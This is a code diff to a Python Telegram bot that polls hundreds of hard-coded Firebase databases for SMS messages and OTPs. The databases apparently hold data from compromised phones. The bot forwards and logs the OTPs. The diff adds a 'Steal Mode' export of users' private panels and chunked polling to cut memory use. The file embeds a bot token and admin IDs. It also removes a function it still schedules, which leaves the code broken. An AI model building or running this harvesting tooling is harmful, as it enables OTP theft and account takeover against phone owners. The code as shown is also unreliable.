@@ -5,6 +5,7 @@
   Enterprise Worker Architecture + On-Demand Sync
   + Strict 1-Hour Fast Inbox + Background Ghost Workers
   + Referral System + Strict Force Join + Steal Mode
+  + LOW-RAM OPTIMIZED (RAILWAY OOM CRASH FIX)
 ══════════════════════════════════════════════════════
 """
 
@@ -33,7 +34,7 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# 🛑 Suppress Windows Asyncio Error Spam & Python Warnings
+# 🛑 Suppress Warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 logging.basicConfig(
     format="%(asctime)s — %(levelname)s — %(message)s",
@@ -52,12 +53,12 @@ PAGE_SIZE       = 20
 TOKEN           = "8839521261:AAFjpwMHtt3TtECRmfKHirqUw0i7tPUQRpQ"
 BOT_USERNAME    = "offermeeshobot"
 
-# 🔴 All your Admin IDs are registered here
+# 🔴 Admin IDs
 ADMIN_IDS: set[int] = {
-    6860106371, 8306147833, 8952700, 648746
+    6860106371, 8306147833, 8955700, 1948746
 }
 
-# 🔴 MANDATORY CHANNELS FOR FORCE JOIN
+# 🔴 Force Join Channels
 FORCE_JOIN_CHATS = [
     "@sabkijayhokhush", 
     "@leakmethodfree", 
@@ -70,7 +71,6 @@ CLONES_DIR = os.path.join(DB_DIR, "Clones")
 SYS_DIR = os.path.join(DB_DIR, "System")
 SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 
-# State Tracking
 seen_ids:  set[str] = set()   
 first_run: bool     = True
 _main_app: Optional[Application] = None
@@ -93,9 +93,9 @@ SETTINGS = {
     "global_panels": []
 }
 
-# Ultimate Concurrency
+# 🟢 MEMORY OPTIMIZATION: Reduced concurrency to fit 500MB Railway Plan
 API_LOCK = asyncio.Lock()
-WORKER_SEMAPHORE = asyncio.Semaphore(1500) 
+WORKER_SEMAPHORE = asyncio.Semaphore(50) 
 PREFETCH_POOL: dict[str, list] = {}
 PREFETCH_TASKS: dict[str, asyncio.Task] = {}
 
@@ -140,10 +140,6 @@ SYS_SETTINGS = {
     ],
     "check_anim": "⚡"
 }
-
-# ═══════════════════════════════════════════════════════
-#  DATABASES
-# ═══════════════════════════════════════════════════════
 
 RAW_URLS = list(set([
     "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com",
@@ -424,7 +420,7 @@ RAW_URLS = list(set([
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 
 # ═══════════════════════════════════════════════════════
-#  DATA CLASSES 
+#  DATA CLASSES
 # ═══════════════════════════════════════════════════════
 
 class Device:
@@ -546,23 +542,11 @@ def master_log_sms(number: str, message: str, otp: str):
             f.write(log_line)
     except: pass
 
-async def auto_save_loop():
-    while True:
-        try:
-            await asyncio.sleep(60)
-            await save_data_async()
-            if len(seen_ids) > 80000:
-                seen_ids.clear()
-                gc.collect()
-        except Exception:
-            await asyncio.sleep(5)
-
 # ═══════════════════════════════════════════════════════
 #  WORKER 3: ADMIN AUTO-BACKUP DEPARTMENT
 # ═══════════════════════════════════════════════════════
 
 async def hourly_admin_backup(app: Application):
-    """Hourly task to send admin dashboard stats and backup JSON file."""
     while True:
         await asyncio.sleep(3600)
         try:
@@ -643,13 +627,13 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     tlog(f"Telegram API Error: {err_str}")
 
 # ═══════════════════════════════════════════════════════
-#  FAST HTTP SESSION MANAGER 
+#  FAST HTTP SESSION MANAGER (LOW RAM LIMITS)
 # ═══════════════════════════════════════════════════════
 
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=1500, keepalive_timeout=30, enable_cleanup_closed=True)
+        connector = aiohttp.TCPConnector(limit=100, keepalive_timeout=30, enable_cleanup_closed=True)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -679,7 +663,6 @@ async def fb_keys(path: str, base: str) -> list[str]:
 # ═══════════════════════════════════════════════════════
 
 async def fetch_db_data(tag: str, url: str) -> list[Device]:
-    """Single DB fetcher used for both background and on-demand loads."""
     async with WORKER_SEMAPHORE:
         devices_list = []
         added_set = set()
@@ -739,10 +722,6 @@ async def fetch_db_data(tag: str, url: str) -> list[Device]:
         return devices_list
 
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None, auto_fallback: bool = True) -> list[Device]:
-    """ 
-    ENTERPRISE LOGIC: Fetches from Cache first. 
-    If a Custom Panel was just added and isn't cached yet, fetches it ON-DEMAND instantly.
-    """
     if users_db is None: users_db = {}
     uinfo = users_db.get(chat_id, {})
     is_vip = uinfo.get("vip_until", 0) > time.time()
@@ -750,7 +729,7 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     steal_mode = uinfo.get("user_panels_mode", False) and is_admin
     custom_dbs = get_user_dbs(uinfo)
     
-    target_dbs = [] # Holds (tag, url)
+    target_dbs = [] 
     
     if steal_mode:
         for uid, u_data in all_users.items():
@@ -770,12 +749,10 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     missing_tasks = []
     missing_tags = []
 
-    # Check Cache OR Fetch On-Demand
     for tag, url in target_dbs:
         if tag in GLOBAL_DEVICE_CACHE:
             devices.extend(GLOBAL_DEVICE_CACHE[tag])
         else:
-            # 🔴 Fast On-Demand loading for new panels
             missing_tasks.append(fetch_db_data(tag, url))
             missing_tags.append(tag)
 
@@ -1188,7 +1165,8 @@ def admin_keyboard(bot_token: str, chat_id: int) -> InlineKeyboardMarkup:
     keys = [
         [InlineKeyboardButton(ghost_btn, callback_data="toggle_ghost")],
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
-        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
+        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), 
+         InlineKeyboardButton("Export Panels (.txt)", callback_data="sa_export_panels")], 
         [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
         [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
         [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
@@ -1472,6 +1450,28 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
             return
 
+        if data == "sa_export_panels":
+            extracted_urls = set()
+            for uid, uinfo in users_db.items():
+                for db in get_user_dbs(uinfo):
+                    extracted_urls.add(db)
+            
+            if not extracted_urls:
+                await query.answer("Koi bhi custom panel add nahi kiya gaya hai.", show_alert=True)
+                return
+                
+            file_path = os.path.join(SYS_DIR, "Exported_User_Panels.txt")
+            with open(file_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(extracted_urls))
+            
+            await ctx.bot.send_document(
+                chat_id=chat_id, document=open(file_path, "rb"), 
+                filename=f"User_Panels_{int(time.time())}.txt", 
+                caption=f"📁 **Total Extracted Panels:** {len(extracted_urls)}\nYeh sabhi users dwara add kiye gaye private panels hain.",
+                parse_mode="Markdown"
+            )
+            return
+
         if data == "sa_export_numbers":
             devices = await get_all_devices(bot_token, chat_id, users_db)
             online_nums = []
@@ -1626,7 +1626,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         except: pass
 
 # ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER (ANTI-SPAM & CHOKE FIX)
+#  TEXT MESSAGE HANDLER
 # ═══════════════════════════════════════════════════════
 
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1774,11 +1774,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         await wait_msg.edit_text(results_text, reply_markup=InlineKeyboardMarkup(kb))
         return
 
-    if text == "Admin Panel" and chat_id in ADMIN_IDS:
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text(admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
-        return
-
     if text.lower() in ("/cancel", "cancel"):
         if chat_id in pending_action:
             pending_action.pop(chat_id)
@@ -1902,7 +1897,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE POLL — DEPARTMENT 2 (SMS LISTENER)
+#  FIREBASE POLL — BATCH PROCESSING (OOM FIX)
 # ═══════════════════════════════════════════════════════
 
 async def _forward_sms(device: Device, sms: dict) -> None:
@@ -2015,12 +2010,7 @@ async def poll_single_db(tag: str, url: str) -> int:
         return forwarded
     except: return 0
 
-# ═══════════════════════════════════════════════════════
-#  FIREBASE POLL — DEPARTMENT 1 (DEVICE CACHE MANAGER)
-# ═══════════════════════════════════════════════════════
-
 async def _update_global_cache():
-    """Worker 1: Dedicated to keeping the Global Device Cache updated concurrently."""
     dbs_to_poll = dict(DATABASES)
     for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
         dbs_to_poll[f"G_{i}"] = g_url
@@ -2029,20 +2019,21 @@ async def _update_global_cache():
         for i, db_url in enumerate(get_user_dbs(uinfo)):
             dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
-    async def fetch_and_store(tag, url):
-        devs = await fetch_db_data(tag, url)
-        if devs: GLOBAL_DEVICE_CACHE[tag] = devs
-        return devs
-
-    # 🔴 CONCURRENT FETCHING: Loads 300+ panels instantly instead of sequentially
-    tasks = [fetch_and_store(tag, url) for tag, url in dbs_to_poll.items()]
-    await asyncio.gather(*tasks, return_exceptions=True)
-
-    # Compile the "ALL" list for VIP/Admins
+    # 🟢 CHUNKING FIX: Processes DBs 30 at a time to prevent RAM overload
     all_devices_gathered = []
-    for devs in GLOBAL_DEVICE_CACHE.values():
-        all_devices_gathered.extend(devs)
-
+    items = list(dbs_to_poll.items())
+    
+    for i in range(0, len(items), 30):
+        chunk = items[i:i+30]
+        tasks = [fetch_db_data(tag, url) for tag, url in chunk]
+        res = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in res:
+            if isinstance(r, list):
+                all_devices_gathered.extend(r)
+                
+        await asyncio.sleep(0.2) 
+        gc.collect() 
+        
     unique_devices = []
     seen_ids_cache = set()
     seen_numbers = set()
@@ -2057,30 +2048,19 @@ async def _update_global_cache():
                 continue 
             d.numbers = new_nums
             seen_numbers.update(new_nums)
+        
         unique_devices.append(d)
 
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
     GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
 
-async def device_sync_worker():
-    while True:
-        try:
-            await _update_global_cache()
-        except Exception as e:
-            tlog(f"Device Sync Worker Error: {e}")
-        await asyncio.sleep(15) # Keep cache hot every 15 seconds
-
 async def poll_loop(app: Application) -> None:
     global first_run, _main_app
     _main_app = app
-    
-    # Wait for the first cache update to finish before starting SMS polling
-    await _update_global_cache()
-    first_run = False
-    tlog("Private Bot Engine ready! Monitoring DBs...")
-    
     while True:
         try:
+            await _update_global_cache()
+            
             dbs_to_poll = dict(DATABASES)
             for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
                 dbs_to_poll[f"G_{i}"] = g_url
@@ -2088,17 +2068,47 @@ async def poll_loop(app: Application) -> None:
             for uid, uinfo in all_users.items():
                 for i, db_url in enumerate(get_user_dbs(uinfo)):
                     dbs_to_poll[f"U_{uid}_{i}"] = db_url
+            
+            if first_run:
+                # 🟢 CHUNKING FIX For initial Load
+                items = list(dbs_to_poll.items())
+                for i in range(0, len(items), 30):
+                    chunk = items[i:i+30]
+                    tasks = []
+                    for tag, url in chunk:
+                        tasks.append(fb_get("All_Users/sms", url))
+                        tasks.append(fb_get("user_sms", url))
+                        tasks.append(fb_get("sms", url))
+                    
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    for bulk in results:
+                        if isinstance(bulk, dict):
+                            for dev_id, sms_dict in bulk.items():
+                                if isinstance(sms_dict, dict):
+                                    for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
+                    await asyncio.sleep(0.2)
+                    gc.collect()
 
-            tasks = [poll_single_db(tag, url) for tag, url in dbs_to_poll.items()]
-            await asyncio.gather(*tasks)
+                first_run = False
+                tlog("Private Bot Engine ready! Monitoring DBs...")
+            else:
+                # 🟢 CHUNKING FIX For Polling Loop
+                items = list(dbs_to_poll.items())
+                for i in range(0, len(items), 30):
+                    chunk = items[i:i+30]
+                    tasks = [poll_single_db(tag, url) for tag, url in chunk]
+                    await asyncio.gather(*tasks, return_exceptions=True)
+                    await asyncio.sleep(0.5)
+                    gc.collect()
+                    
         except Exception as e:
-            tlog(f"SMS Polling Exception: {e}")
+            tlog(f"Polling Exception: {e}")
             await asyncio.sleep(5)
             
         await asyncio.sleep(POLL_INTERVAL)
 
 # ═══════════════════════════════════════════════════════
-#  MAIN ENTRY POINT (WINDOWS CRASH FIX ENABLED)
+#  MAIN ENTRY POINT (LOW RAM LIMITS)
 # ═══════════════════════════════════════════════════════
 
 def main() -> None:
@@ -2113,7 +2123,7 @@ def main() -> None:
     app = (
         Application.builder()
         .token(TOKEN)
-        .connection_pool_size(4096)
+        .connection_pool_size(100) # 🟢 Dropped from 4096 to 100 for Railway Limit
         .pool_timeout(60.0)
         .connect_timeout(30.0)
         .read_timeout(30.0)
@@ -2128,10 +2138,9 @@ def main() -> None:
 
     async def post_init(application: Application) -> None:
         load_data()
-        asyncio.create_task(device_sync_worker()) # Dept 1: Device Cacher
-        asyncio.create_task(poll_loop(application)) # Dept 2: SMS Poller
+        asyncio.create_task(poll_loop(application))
         asyncio.create_task(auto_save_loop())
-        asyncio.create_task(hourly_admin_backup(application)) # Dept 3: Auto-Backup
+        asyncio.create_task(hourly_admin_backup(application))
 
     app.post_init = post_init
     app.run_polling(drop_pending_updates=True)
